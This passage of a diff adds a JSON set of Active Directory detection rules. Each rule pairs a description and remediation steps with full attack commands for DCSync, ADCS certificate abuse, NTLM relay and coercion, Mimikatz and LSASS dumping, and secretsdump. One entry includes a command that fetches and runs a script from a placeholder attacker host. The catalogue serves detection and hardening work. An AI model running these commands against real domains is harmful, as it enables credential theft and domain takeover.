@@ -1,0 +1,1898 @@
+[
+  {
+    "category": "ACL ABUSE",
+    "id": "acl-dcsync-grant-001",
+    "title": "DCSync Rights Granted to Unprivileged Account via dacledit",
+    "severity": "CRITICAL",
+    "mitre": "T1484.001",
+    "description": "Detects modification of domain object DACL to grant DS-Replication permissions to a non-privileged account. Enables DCSync attacks from any machine with that account's credentials.",
+    "commands": [
+      "impacket-dacledit -action write -rights DCSync -principal {user} -target-dn '{base_dn}' {dom}/{user}:{pass}"
+    ],
+    "all_commands": [
+      "impacket-dacledit -action write -rights DCSync -principal {user} -target-dn '{base_dn}' {dom}/{user}:{pass}"
+    ],
+    "remediation": [
+      "Audit and alert on Event ID 5136 for domain object ACL changes",
+      "Restrict WriteDACL permission on domain object to DA only",
+      "Monitor dacledit tool execution via process creation events"
+    ]
+  },
+  {
+    "category": "ACL ABUSE",
+    "id": "acl-group-addmember-001",
+    "title": "Unauthorized Group Membership Addition \u2014 GenericAll/GenericWrite Abuse",
+    "severity": "CRITICAL",
+    "mitre": "T1098",
+    "description": "Detects adding unauthorized users to privileged groups using GenericAll or GenericWrite ACE over the target group. Enables privilege escalation by adding attacker account to Domain Admins, Enterprise Admins, etc.",
+    "commands": [
+      "net rpc group addmem '{grp}' '{user}' -U {dom}\\\\{user}%{pass} -S {dc}",
+      "Add-DomainGroupMember -Identity 'Domain Admins' -Members {user}"
+    ],
+    "all_commands": [
+      "net rpc group addmem '{grp}' '{user}' -U {dom}\\\\{user}%{pass} -S {dc}",
+      "Add-DomainGroupMember -Identity 'Domain Admins' -Members {user}"
+    ],
+    "remediation": [
+      "Alert on Event IDs 4728/4732/4756 for sensitive groups immediately",
+      "Implement Privileged Identity Management (PIM) for group membership changes",
+      "Audit GenericAll/GenericWrite ACEs on privileged groups"
+    ]
+  },
+  {
+    "category": "ACL ABUSE",
+    "id": "acl-forcechangepassword-001",
+    "title": "Force Password Change \u2014 ExtendedRight Abuse",
+    "severity": "HIGH",
+    "mitre": "T1098",
+    "description": "Detects forced password changes using ExtendedRight \"User-Force-Change-Password\" ACE. Attacker changes target account password without knowing current password, enabling account takeover.",
+    "commands": [
+      "impacket-changepasswd {dom}/{victim}@{dc} -newpass '{newpass}' -altuser {user} -altpass '{pass}'",
+      "Set-DomainUserPassword -Identity {victim} -AccountPassword (ConvertTo-SecureString '{pass}' -AsPlainText -Force)",
+      "net rpc password {victim} '{newpass}' -U {dom}\\\\{user}%{pass} -S {dc}"
+    ],
+    "all_commands": [
+      "impacket-changepasswd {dom}/{victim}@{dc} -newpass '{newpass}' -altuser {user} -altpass '{pass}'",
+      "Set-DomainUserPassword -Identity {victim} -AccountPassword (ConvertTo-SecureString '{pass}' -AsPlainText -Force)",
+      "net rpc password {victim} '{newpass}' -U {dom}\\\\{user}%{pass} -S {dc}"
+    ],
+    "remediation": [
+      "Audit User-Force-Change-Password ACE on all user objects",
+      "Alert on Event ID 4724 where subject != target",
+      "Implement time-based alerting for off-hours password changes"
+    ]
+  },
+  {
+    "category": "ACL ABUSE",
+    "id": "acl-shadow-credentials-001",
+    "title": "Shadow Credentials \u2014 msDS-KeyCredentialLink Attribute Injection",
+    "severity": "CRITICAL",
+    "mitre": "T1556.006",
+    "description": "Detects injection of attacker-controlled key into msDS-KeyCredentialLink attribute (Windows Hello for Business). Enables Kerberos pre-auth using certificate without knowing account password. Works via certipy shadow auto.",
+    "commands": [
+      "certipy shadow auto -u {user}@{dom} -p {pass} -account '{target}' -dc-ip {dc}",
+      "pywhfb -target {target} -dc-ip {dc} -u {user} -p {pass}",
+      "Whisker.exe add /target:{target}"
+    ],
+    "all_commands": [
+      "certipy shadow auto -u {user}@{dom} -p {pass} -account '{target}' -dc-ip {dc}",
+      "pywhfb -target {target} -dc-ip {dc} -u {user} -p {pass}",
+      "Whisker.exe add /target:{target}"
+    ],
+    "remediation": [
+      "Alert on any msDS-KeyCredentialLink modification (Event 5136)",
+      "Restrict write access to msDS-KeyCredentialLink attribute",
+      "Enable audit logging for AD attribute changes (Advanced Audit Policy)"
+    ]
+  },
+  {
+    "category": "ACL ABUSE",
+    "id": "acl-add-computer-001",
+    "title": "Computer Account Creation via MachineAccountQuota",
+    "severity": "HIGH",
+    "mitre": "T1098.001",
+    "description": "Detects creation of computer accounts by non-privileged users exploiting the default MachineAccountQuota=10. Used as prerequisite for RBCD attacks and other computer-account-dependent escalations.",
+    "commands": [
+      "impacket-addcomputer -computer-name '{comp}$' -computer-pass '{pass}' {dom}/{user}:{pass} -dc-ip {dc}",
+      "New-MachineAccount -MachineAccount {comp} -Password (ConvertTo-SecureString '{pass}' -AsPlainText -Force)"
+    ],
+    "all_commands": [
+      "impacket-addcomputer -computer-name '{comp}$' -computer-pass '{pass}' {dom}/{user}:{pass} -dc-ip {dc}",
+      "New-MachineAccount -MachineAccount {comp} -Password (ConvertTo-SecureString '{pass}' -AsPlainText -Force)"
+    ],
+    "remediation": [
+      "Set MachineAccountQuota to 0 (prevents non-admin computer account creation)",
+      "Set-ADDomain -Identity {domain} -Replace @{'ms-DS-MachineAccountQuota'=0}",
+      "Monitor Event ID 4741 for unexpected computer account creation"
+    ]
+  },
+  {
+    "category": "ACL ABUSE",
+    "id": "acl-laps-read-001",
+    "title": "Unauthorized LAPS Password Read via LDAP",
+    "severity": "HIGH",
+    "mitre": "T1552.006",
+    "description": "Detects unauthorized reading of ms-Mcs-AdmPwd (LAPS password) attribute from Active Directory. Provides local admin credentials for LAPS-managed computers.",
+    "commands": [
+      "nxc ldap {dc} -u {user} -p {pass} -d {dom} -M laps",
+      "ldapsearch -b '{base_dn}' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd cn",
+      "Get-LAPSPasswords -DomainController {dc} -Credential {creds}"
+    ],
+    "all_commands": [
+      "nxc ldap {dc} -u {user} -p {pass} -d {dom} -M laps",
+      "ldapsearch -b '{base_dn}' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd cn",
+      "Get-LAPSPasswords -DomainController {dc} -Credential {creds}"
+    ],
+    "remediation": [
+      "Enable LAPS attribute access auditing",
+      "Restrict ms-Mcs-AdmPwd read permissions to authorized groups only",
+      "Rotate LAPS passwords immediately after suspected compromise"
+    ]
+  },
+  {
+    "category": "ACL ABUSE",
+    "id": "acl-bloodhound-001",
+    "title": "BloodHound LDAP Collection \u2014 ACL Enumeration for Attack Path Discovery",
+    "severity": "HIGH",
+    "mitre": "T1087.002",
+    "description": "Detects BloodHound data collection which queries all AD objects, ACLs, group memberships, and computer sessions via LDAP. Creates large number of LDAP queries in short time.",
+    "commands": [
+      "bloodhound-python -u {user} -p {pass} -d {dom} -dc {dc} -c All --zip"
+    ],
+    "all_commands": [
+      "bloodhound-python -u {user} -p {pass} -d {dom} -dc {dc} -c All --zip",
+      "SharpHound.exe -c All --zipfilename bh.zip"
+    ],
+    "remediation": [
+      "Monitor for bulk LDAP queries from non-DC hosts",
+      "Implement Microsoft Defender for Identity BloodHound detection",
+      "Deploy AD Canary objects that alert on enumeration"
+    ]
+  },
+  {
+    "category": "CERT ABUSE",
+    "id": "cert-esc1-001",
+    "title": "ESC1 \u2014 Certificate Enrollment with Arbitrary SAN (Domain Admin Impersonation)",
+    "severity": "CRITICAL",
+    "mitre": "T1649",
+    "description": "ESC1: Certificate template allows requestor to specify Subject Alternative Name (SAN) with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT. Attacker enrolls certificate as Domain Admin by specifying admin UPN in SAN field.",
+    "commands": [
+      "certipy req -u '{user}@{dom}' -p '{pass}' -dc-ip {dc} -template '{template}' -upn 'administrator@{dom}' -ca '{ca}'",
+      "certipy auth -pfx admin.pfx -dc-ip {dc} -domain {dom}"
+    ],
+    "all_commands": [
+      "certipy req -u '{user}@{dom}' -p '{pass}' -dc-ip {dc} -template '{template}' -upn 'administrator@{dom}' -ca '{ca}'",
+      "certipy auth -pfx admin.pfx -dc-ip {dc} -domain {dom}"
+    ],
+    "remediation": [
+      "Remove CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT from template flags",
+      "Require CA Manager Approval for sensitive templates",
+      "Enable \"Auditing\" on all certificate templates"
+    ]
+  },
+  {
+    "category": "CERT ABUSE",
+    "id": "cert-esc4-001",
+    "title": "ESC4 \u2014 Certificate Template ACL Overwrite (WriteDACL/WriteOwner/GenericWrite)",
+    "severity": "CRITICAL",
+    "mitre": "T1649",
+    "description": "ESC4: Attacker has WriteDACL, WriteOwner, or GenericWrite over a certificate template. Modifies template to grant ENROLLEE_SUPPLIES_SUBJECT, then requests certificate as DA. Certipy template command with -save-old preserves original.",
+    "commands": [
+      "certipy template -u '{user}@{dom}' -p '{pass}' -dc-ip {dc} -template '{template}' -save-old"
+    ],
+    "all_commands": [
+      "certipy template -u '{user}@{dom}' -p '{pass}' -dc-ip {dc} -template '{template}' -save-old"
+    ],
+    "remediation": [
+      "Audit and alert on Event 5136 for pKICertificateTemplate object modifications",
+      "Restrict template modification to PKI Admins and Enterprise Admins only",
+      "Review template ACLs regularly with Certify or certipy find"
+    ]
+  },
+  {
+    "category": "CERT ABUSE",
+    "id": "cert-esc6-001",
+    "title": "ESC6 \u2014 CA Flag Abuse (EDITF_ATTRIBUTESUBJECTALTNAME2)",
+    "severity": "CRITICAL",
+    "mitre": "T1649",
+    "description": "ESC6: CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set, allowing SAN in any request even if template doesn't have ENROLLEE_SUPPLIES_SUBJECT. Equivalent impact to ESC1 but at CA level.",
+    "commands": [
+      "certipy ca -u '{user}@{dom}' -p '{pass}' -dc-ip {dc} -enable-template 'SubCA'",
+      "certipy req -u '{user}@{dom}' -p '{pass}' -dc-ip {dc} -template SubCA -upn 'administrator@{dom}' -ca '{ca}'"
+    ],
+    "all_commands": [
+      "certipy ca -u '{user}@{dom}' -p '{pass}' -dc-ip {dc} -enable-template 'SubCA'",
+      "certipy req -u '{user}@{dom}' -p '{pass}' -dc-ip {dc} -template SubCA -upn 'administrator@{dom}' -ca '{ca}'"
+    ],
+    "remediation": [
+      "Remove EDITF_ATTRIBUTESUBJECTALTNAME2 flag from CA",
+      "certutil -setreg policy\\\\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2",
+      "Restart CertSvc after change"
+    ]
+  },
+  {
+    "category": "CERT ABUSE",
+    "id": "cert-esc8-001",
+    "title": "ESC8 \u2014 NTLM Relay to ADCS Web Enrollment for DC Certificate",
+    "severity": "CRITICAL",
+    "mitre": "T1557",
+    "description": "ESC8: ADCS web enrollment endpoint (certsrv) accepts NTLM authentication. Attacker relays DC NTLM authentication (via PrinterBug/PetitPotam) to ADCS, obtains DC certificate, then uses PKINIT to get DC TGT \u2192 DCSync.",
+    "commands": [
+      "impacket-ntlmrelayx -t http://{dc}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
+      "certipy relay -ca {dc} -template DomainController"
+    ],
+    "all_commands": [
+      "impacket-ntlmrelayx -t http://{dc}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
+      "certipy relay -ca {dc} -template DomainController"
+    ],
+    "remediation": [
+      "Enable HTTPS on ADCS web enrollment (disable HTTP)",
+      "Enable EPA (Extended Protection for Authentication) on IIS",
+      "Require Kerberos authentication for ADCS web enrollment"
+    ]
+  },
+  {
+    "category": "CERT ABUSE",
+    "id": "cert-esc9-001",
+    "title": "ESC9 \u2014 No Security Extension (SID Binding Bypass)",
+    "severity": "HIGH",
+    "mitre": "T1649",
+    "description": "ESC9: Template has CT_FLAG_NO_SECURITY_EXTENSION (0x80000) in msPKI-Enrollment-Flag. Issued cert lacks szOID_NTDS_CA_SECURITY_EXT SID binding, allowing cert to be used for auth as different account if GenericWrite exists on target.",
+    "commands": [],
+    "all_commands": [],
+    "remediation": [
+      "Require CA to mark certificates with szOID_NTDS_CA_SECURITY_EXT",
+      "Apply May 2022 cumulative update (KB5014754) \u2014 StrongCertificateBindingEnforcement"
+    ]
+  },
+  {
+    "category": "CERT ABUSE",
+    "id": "cert-esc11-001",
+    "title": "ESC11 \u2014 RPC Relay to Certificate Enrollment (IF_ENFORCEENCRYPTICERTREQUEST)",
+    "severity": "HIGH",
+    "mitre": "T1557",
+    "description": "ESC11: CA does not have IF_ENFORCEENCRYPTICERTREQUEST flag, enabling NTLM relay to RPC-based certificate enrollment (MS-ICPR) without encryption. Attacker relays SMB/HTTP auth to obtain arbitrary certificate.",
+    "commands": [],
+    "all_commands": [],
+    "remediation": [
+      "Set IF_ENFORCEENCRYPTICERTREQUEST flag on CA",
+      "Enable DCOM authentication level >= Packet Privacy"
+    ]
+  },
+  {
+    "category": "CERT ABUSE",
+    "id": "cert-pkinit-001",
+    "title": "PKINIT Authentication \u2014 Certificate Used for Kerberos TGT",
+    "severity": "HIGH",
+    "mitre": "T1558",
+    "description": "Detects use of certificate for Kerberos pre-authentication (PKINIT). Used post-ESC1/ESC6/Shadow Credentials to get TGT. UnPAC-the-Hash extracts NTLM hash from the TGT without touching LSASS.",
+    "commands": [
+      "certipy auth -pfx '{pfx}' -dc-ip {dc} -domain {dom}",
+      "certipy auth -pfx '{pfx}' -dc-ip {dc} -domain {dom} -no-hash  # UnPAC-the-Hash",
+      "Rubeus.exe asktgt /user:{user} /certificate:{base64_pfx} /ptt"
+    ],
+    "all_commands": [
+      "certipy auth -pfx '{pfx}' -dc-ip {dc} -domain {dom}",
+      "certipy auth -pfx '{pfx}' -dc-ip {dc} -domain {dom} -no-hash  # UnPAC-the-Hash",
+      "Rubeus.exe asktgt /user:{user} /certificate:{base64_pfx} /ptt"
+    ],
+    "remediation": [
+      "Monitor Event 4768 with certificate fields populated",
+      "Alert on PKINIT authentication for accounts not enrolled in Smart Card auth"
+    ]
+  },
+  {
+    "category": "CERT ABUSE",
+    "id": "cert-enum-001",
+    "title": "ADCS Template Enumeration \u2014 Certipy find",
+    "severity": "MEDIUM",
+    "mitre": "T1087.002",
+    "description": "Detects ADCS template enumeration via certipy find or Certify.exe. Generates LDAP queries against PKI container for template attributes.",
+    "commands": [
+      "certipy find -u '{user}@{dom}' -p '{pass}' -dc-ip {dc} -vulnerable -stdout"
+    ],
+    "all_commands": [
+      "certipy find -u '{user}@{dom}' -p '{pass}' -dc-ip {dc} -vulnerable -stdout",
+      "Certify.exe find /vulnerable"
+    ],
+    "remediation": [
+      "Monitor bulk pKICertificateTemplate LDAP reads",
+      "Implement AD CS Canary templates that alert on enumeration",
+      "sast_code_analysis:"
+    ]
+  },
+  {
+    "category": "COERCION ATTACKS",
+    "id": "coerce-printerbug-001",
+    "title": "MS-RPRN PrinterBug \u2014 Force DC Authentication via Print Spooler",
+    "severity": "CRITICAL",
+    "mitre": "T1187",
+    "description": "MS-RPRN's RpcRemoteFindFirstPrinterChangeNotification API forces target to authenticate to attacker-controlled host. Used to capture NTLMv2 hash or relay to LDAP/ADCS. Requires Print Spooler running on target DC.",
+    "commands": [
+      "python3 printerbug.py '{dom}/{user}:{pass}@{dc}' {attacker}",
+      ".\\\\MS-RPRN.exe \\\\\\\\{dc} \\\\\\\\{attacker}",
+      "crackmapexec smb {dc} -u {user} -p {pass} -M spooler  # Check if vulnerable"
+    ],
+    "all_commands": [
+      "python3 printerbug.py '{dom}/{user}:{pass}@{dc}' {attacker}",
+      ".\\\\MS-RPRN.exe \\\\\\\\{dc} \\\\\\\\{attacker}",
+      "crackmapexec smb {dc} -u {user} -p {pass} -M spooler  # Check if vulnerable"
+    ],
+    "remediation": [
+      "Disable Print Spooler service on all Domain Controllers (not needed)",
+      "Block SMB outbound from DCs to non-DC hosts (firewall rule)",
+      "Apply PrintNightmare patches and disable outbound SMB from DCs"
+    ]
+  },
+  {
+    "category": "COERCION ATTACKS",
+    "id": "coerce-petitpotam-001",
+    "title": "PetitPotam \u2014 EfsRpc Forced Authentication (Authenticated and Unauthenticated)",
+    "severity": "CRITICAL",
+    "mitre": "T1187",
+    "description": "PetitPotam exploits MS-EFSRPC (EfsRpcOpenFileRaw) to force target to authenticate to attacker. Can work unauthenticated on older Windows versions. Used for NTLM relay to LDAP or ADCS to compromise domain.",
+    "commands": [
+      "python3 PetitPotam.py -u '{user}' -p '{pass}' -d '{dom}' {attacker} {dc}",
+      "python3 PetitPotam.py {attacker} {dc}  # Unauthenticated (older systems)"
+    ],
+    "all_commands": [
+      "python3 PetitPotam.py -u '{user}' -p '{pass}' -d '{dom}' {attacker} {dc}",
+      "python3 PetitPotam.py {attacker} {dc}  # Unauthenticated (older systems)"
+    ],
+    "remediation": [
+      "Apply MS KB5005413 (PetitPotam patches)",
+      "Block LSASS outbound SMB connections via firewall",
+      "Disable EFS if not required"
+    ]
+  },
+  {
+    "category": "COERCION ATTACKS",
+    "id": "coerce-dfscoerce-001",
+    "title": "DFSCoerce \u2014 NetrDfsAddStdRoot MS-DFSNM Forced Authentication",
+    "severity": "HIGH",
+    "mitre": "T1187",
+    "description": "DFSCoerce exploits MS-DFSNM NetrDfsAddStdRoot/NetrDfsRemoveStdRoot to force authentication. Authenticated vector. Works even when PetitPotam is patched.",
+    "commands": [
+      "python3 dfscoerce.py -u '{user}' -p '{pass}' -d '{dom}' {attacker} {dc}"
+    ],
+    "all_commands": [
+      "python3 dfscoerce.py -u '{user}' -p '{pass}' -d '{dom}' {attacker} {dc}"
+    ],
+    "remediation": [
+      "Disable DFS-N service on DCs if not required",
+      "Block outbound SMB from DCs via Windows Firewall",
+      "Monitor DFS RPC interface calls from external hosts"
+    ]
+  },
+  {
+    "category": "COERCION ATTACKS",
+    "id": "coerce-coercer-001",
+    "title": "Coercer Framework \u2014 Automated Multi-Protocol Coercion Scan and Exploit",
+    "severity": "CRITICAL",
+    "mitre": "T1187",
+    "description": "Coercer automatically tries all known coercion methods (MS-RPRN, MS-EFSRPC, MS-DFSNM, MS-FSRVP, MS-TSCH, etc.) against target. -scan mode passive detection, no authentication attempt. High-value target: DCs.",
+    "commands": [
+      "coercer scan -u '{user}' -p '{pass}' -d '{dom}' -t {dc}  # Passive check",
+      "coercer coerce -u '{user}' -p '{pass}' -d '{dom}' -l {attacker} -t {dc}"
+    ],
+    "all_commands": [
+      "coercer scan -u '{user}' -p '{pass}' -d '{dom}' -t {dc}  # Passive check",
+      "coercer coerce -u '{user}' -p '{pass}' -d '{dom}' -l {attacker} -t {dc}"
+    ],
+    "remediation": [
+      "Block all coercible RPC interfaces at network perimeter",
+      "Disable unnecessary services (Spooler, EFS, DFS-N) on DCs"
+    ]
+  },
+  {
+    "category": "COERCION ATTACKS",
+    "id": "coerce-responder-001",
+    "title": "Responder \u2014 LLMNR/NBT-NS Poisoning for NTLMv2 Hash Capture",
+    "severity": "HIGH",
+    "mitre": "T1557.001",
+    "description": "Responder poisons LLMNR and NBT-NS name resolution to redirect victims to attacker's SMB/HTTP server for NTLMv2 hash capture. Combined with coercion for targeted hash collection.",
+    "commands": [],
+    "all_commands": [
+      "sudo responder -I eth0 -rdw  # Start poisoner",
+      "Combined with coercion to capture DC$ NTLMv2 hash"
+    ],
+    "remediation": [
+      "Disable LLMNR via Group Policy: Computer Configuration \u2192 Administrative Templates \u2192 Network \u2192 DNS Client \u2192 Turn off multicast name resolution",
+      "Disable NetBIOS over TCP/IP (disable NBT-NS)",
+      "Monitor for unexpected LLMNR/NBT-NS responses on network"
+    ]
+  },
+  {
+    "category": "COERCION ATTACKS",
+    "id": "coerce-ntlm-relay-ldap-001",
+    "title": "NTLM Relay to LDAP \u2014 Computer Account / DCSync Rights",
+    "severity": "CRITICAL",
+    "mitre": "T1557",
+    "description": "NTLM relay to LDAP/LDAPS allows attacker to authenticate as victim (typically DC$) and perform LDAP operations: add computer accounts, grant DCSync rights, set RBCD, or modify group membership. impacket-ntlmrelayx --delegate-access enables RBCD relay.",
+    "commands": [
+      "impacket-ntlmrelayx -t ldap://{dc} -smb2support --add-computer {comp} {comp_pass}",
+      "impacket-ntlmrelayx -t ldaps://{dc} -smb2support --escalate-user {user}",
+      "impacket-ntlmrelayx -t ldap://{dc} -smb2support --delegate-access  # RBCD"
+    ],
+    "all_commands": [
+      "impacket-ntlmrelayx -t ldap://{dc} -smb2support --add-computer {comp} {comp_pass}",
+      "impacket-ntlmrelayx -t ldaps://{dc} -smb2support --escalate-user {user}",
+      "impacket-ntlmrelayx -t ldap://{dc} -smb2support --delegate-access  # RBCD"
+    ],
+    "remediation": [
+      "Enable LDAP signing (require signing for LDAP clients)",
+      "Enable LDAP channel binding (CVE-2017-8563 mitigations)",
+      "Enforce SMB signing (prevents relay from SMB sources)"
+    ]
+  },
+  {
+    "category": "COERCION ATTACKS",
+    "id": "coerce-ntlm-relay-adcs-001",
+    "title": "NTLM Relay to ADCS \u2014 DC Certificate Enrollment for DA Takeover",
+    "severity": "CRITICAL",
+    "mitre": "T1649",
+    "description": "Most impactful relay attack: coerce DC$ authentication, relay to ADCS web enrollment, obtain DC certificate, use PKINIT to get DC TGT, then DCSync all hashes. Full domain compromise in minutes. Attack chain: PetitPotam \u2192 ntlmrelayx --adcs \u2192 certipy auth \u2192 secretsdump",
+    "commands": [
+      "impacket-ntlmrelayx -t http://{dc}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
+      "certipy relay -ca {dc} -template DomainController",
+      "certipy auth -pfx dc.pfx -dc-ip {dc} -domain {dom}  # Get DC TGT",
+      "impacket-secretsdump {dom}/dc$@{dc} -k -no-pass  # DCSync"
+    ],
+    "all_commands": [
+      "impacket-ntlmrelayx -t http://{dc}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
+      "certipy relay -ca {dc} -template DomainController",
+      "certipy auth -pfx dc.pfx -dc-ip {dc} -domain {dom}  # Get DC TGT",
+      "impacket-secretsdump {dom}/dc$@{dc} -k -no-pass  # DCSync"
+    ],
+    "remediation": [
+      "Enable HTTPS + EPA on ADCS Web Enrollment (prevents relay)",
+      "Require Kerberos for ADCS enrollment",
+      "Monitor ADCS Event 4887 for cross-machine DC cert issuance"
+    ]
+  },
+  {
+    "category": "COERCION ATTACKS",
+    "id": "coerce-shadow-cred-relay-001",
+    "title": "NTLM Relay with Shadow Credentials \u2014 msDS-KeyCredentialLink via Relay",
+    "severity": "CRITICAL",
+    "mitre": "T1556.006",
+    "description": "ntlmrelayx --shadow-credentials injects attacker certificate into msDS-KeyCredentialLink of target account (usually DC$) during relay. Enables PKINIT authentication as DC$ \u2192 DCSync.",
+    "commands": [
+      "impacket-ntlmrelayx -t ldap://{dc} --shadow-credentials --shadow-target {target}$"
+    ],
+    "all_commands": [
+      "impacket-ntlmrelayx -t ldap://{dc} --shadow-credentials --shadow-target {target}$"
+    ],
+    "remediation": [
+      "Enable LDAP signing + channel binding",
+      "Monitor msDS-KeyCredentialLink modifications (Event 5136)",
+      "Alert on computer accounts modifying other computer accounts' attributes"
+    ]
+  },
+  {
+    "category": "COERCION ATTACKS",
+    "id": "coerce-unconstrained-tgt-001",
+    "title": "Unconstrained Delegation TGT Capture via Coercion",
+    "severity": "CRITICAL",
+    "mitre": "T1134.001",
+    "description": "Rubeus monitor on unconstrained delegation host captures forwarded TGT when coercion forces DC to authenticate. Captured TGT used for Pass-the-Ticket \u2192 DCSync or domain compromise.",
+    "commands": [
+      "Rubeus.exe monitor /interval:5 /filteruser:DC$  # On unconstrained host",
+      "Rubeus.exe ptt /ticket:{base64}  # After capture",
+      "Rubeus.exe s4u /ticket:{base64} /impersonateuser:Administrator /msdsspn:cifs/{dc} /ptt"
+    ],
+    "all_commands": [
+      "Rubeus.exe monitor /interval:5 /filteruser:DC$  # On unconstrained host",
+      "Rubeus.exe ptt /ticket:{base64}  # After capture",
+      "Rubeus.exe s4u /ticket:{base64} /impersonateuser:Administrator /msdsspn:cifs/{dc} /ptt"
+    ],
+    "remediation": [
+      "Remove Unconstrained Delegation from non-DC computers",
+      "Enable Protected Users group for privileged service accounts",
+      "Monitor Rubeus.exe execution"
+    ]
+  },
+  {
+    "category": "CREDENTIAL DUMP",
+    "id": "credump-lsass-001",
+    "title": "LSASS Memory Access \u2014 Credential Extraction",
+    "severity": "CRITICAL",
+    "mitre": "T1003.001",
+    "description": "Detects attempts to read LSASS process memory for credential extraction. Covers Mimikatz, lsassy, nanodump, PPLdump, and SafetyKatz techniques.",
+    "commands": [
+      "mimikatz sekurlsa::logonpasswords",
+      "mimikatz sekurlsa::ekeys",
+      "rundll32.exe C:\\\\Windows\\\\System32\\\\comsvcs.dll MiniDump {lsass_pid} C:\\\\lsass.dmp full",
+      "nxc smb {dc} -u {user} -p {pass} -M lsassy",
+      "lsassy -d {dom} -u {user} -p {pass} {dc}"
+    ],
+    "all_commands": [
+      "mimikatz sekurlsa::logonpasswords",
+      "mimikatz sekurlsa::ekeys",
+      "C:\\\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit",
+      "Invoke-Mimi -Command '\\\"sekurlsa::logonpasswords\\\"'",
+      "rundll32.exe C:\\\\Windows\\\\System32\\\\comsvcs.dll MiniDump {lsass_pid} C:\\\\lsass.dmp full",
+      "nxc smb {dc} -u {user} -p {pass} -M lsassy",
+      "lsassy -d {dom} -u {user} -p {pass} {dc}"
+    ],
+    "remediation": [
+      "Enable RunAsPPL (Protected Process Light) for LSASS",
+      "Deploy Credential Guard (virtualizes LSASS \u2014 no NTLM hashes in memory)",
+      "Block procdump.exe and nanodump.exe via AppLocker/WDAC"
+    ]
+  },
+  {
+    "category": "CREDENTIAL DUMP",
+    "id": "credump-lsass-invoke-mimi-001",
+    "title": "Invoke-Mimi PowerShell In-Memory Credential Dump",
+    "severity": "CRITICAL",
+    "mitre": "T1003.001",
+    "description": "Detects Invoke-Mimi (PowerShell in-memory Mimikatz) execution for credential dumping. No binary written to disk \u2014 loaded via DownloadString.",
+    "commands": [
+      "iex ((New-Object Net.WebClient).DownloadString('http://{attacker}/Invoke-Mimi.ps1'))",
+      "Invoke-Mimi -Command '\\\"lsadump::dcsync /user:{dom}\\\\krbtgt\\\"'"
+    ],
+    "all_commands": [
+      "iex ((New-Object Net.WebClient).DownloadString('http://{attacker}/Invoke-Mimi.ps1'))",
+      "Invoke-Mimi -Command '\\\"sekurlsa::logonpasswords\\\"'",
+      "Invoke-Mimi -Command '\\\"sekurlsa::ekeys\\\"'",
+      "Invoke-Mimi -Command '\\\"lsadump::dcsync /user:{dom}\\\\krbtgt\\\"'"
+    ],
+    "remediation": [
+      "Enable PowerShell Script Block Logging (GPO)",
+      "Enable PowerShell Module Logging",
+      "Use Constrained Language Mode (CLM) for PowerShell"
+    ]
+  },
+  {
+    "category": "CREDENTIAL DUMP",
+    "id": "credump-sam-001",
+    "title": "SAM Registry Hive Access \u2014 Local Account Hash Extraction",
+    "severity": "HIGH",
+    "mitre": "T1003.002",
+    "description": "Detects access to SAM registry hive for local account credential extraction. impacket-secretsdump uses remote registry service; reg save copies hive.",
+    "commands": [
+      "impacket-secretsdump {dom}/{user}:{pass}@{dc} -sam -system -outputfile /tmp/sam_dump",
+      "impacket-secretsdump -sam C:\\\\sam.save -system C:\\\\system.save LOCAL"
+    ],
+    "all_commands": [
+      "impacket-secretsdump {dom}/{user}:{pass}@{dc} -sam -system -outputfile /tmp/sam_dump",
+      "reg save HKLM\\\\SAM C:\\\\sam.save",
+      "reg save HKLM\\\\SYSTEM C:\\\\system.save",
+      "impacket-secretsdump -sam C:\\\\sam.save -system C:\\\\system.save LOCAL"
+    ],
+    "remediation": [
+      "Restrict remote registry access via Group Policy",
+      "Monitor RemoteRegistry service start events",
+      "Alert on SAM/SECURITY hive access by non-SYSTEM accounts"
+    ]
+  },
+  {
+    "category": "CREDENTIAL DUMP",
+    "id": "credump-ntds-dcsync-001",
+    "title": "DCSync \u2014 Replication-Based NTDS Hash Extraction",
+    "severity": "CRITICAL",
+    "mitre": "T1003.003",
+    "description": "DCSync mimics DC replication to extract password hashes without touching NTDS.dit file. Requires DS-Replication-Get-Changes-All privilege. Used by impacket-secretsdump and mimikatz lsadump::dcsync.",
+    "commands": [
+      "impacket-secretsdump {dom}/{user}:{pass}@{dc} -just-dc-ntlm -outputfile /tmp/ntds_hashes",
+      "mimikatz lsadump::dcsync /user:{dom}\\\\krbtgt",
+      "mimikatz lsadump::dcsync /all /csv",
+      "Invoke-Mimi -Command '\\\"lsadump::dcsync /user:{dom}\\\\krbtgt\\\"'"
+    ],
+    "all_commands": [
+      "impacket-secretsdump {dom}/{user}:{pass}@{dc} -just-dc-ntlm -outputfile /tmp/ntds_hashes",
+      "mimikatz lsadump::dcsync /user:{dom}\\\\krbtgt",
+      "mimikatz lsadump::dcsync /all /csv",
+      "Invoke-Mimi -Command '\\\"lsadump::dcsync /user:{dom}\\\\krbtgt\\\"'"
+    ],
+    "remediation": [
+      "Audit DS-Replication-Get-Changes ACE on domain object",
+      "Alert on 4662 with replication GUIDs from non-DC sources",
+      "Deploy Microsoft Defender for Identity DCSync detection"
+    ]
+  },
+  {
+    "category": "CREDENTIAL DUMP",
+    "id": "credump-lsa-secrets-001",
+    "title": "LSA Secrets Extraction via Remote Registry",
+    "severity": "HIGH",
+    "mitre": "T1003.004",
+    "description": "LSA Secrets store service account credentials, DPAPI master keys, and cached domain credentials. Accessible via SECURITY hive or remote secretsdump with SYSTEM privileges.",
+    "commands": [
+      "impacket-secretsdump {dom}/{user}:{pass}@{dc} -just-dc-user SYSTEM",
+      "impacket-secretsdump {dom}/{user}:{pass}@{dc} -outputfile /tmp/full_dump"
+    ],
+    "all_commands": [
+      "impacket-secretsdump {dom}/{user}:{pass}@{dc} -just-dc-user SYSTEM",
+      "impacket-secretsdump {dom}/{user}:{pass}@{dc} -outputfile /tmp/full_dump"
+    ],
+    "remediation": [
+      "Enable LSA Protection (PPL for LSA process)",
+      "Restrict remote registry access",
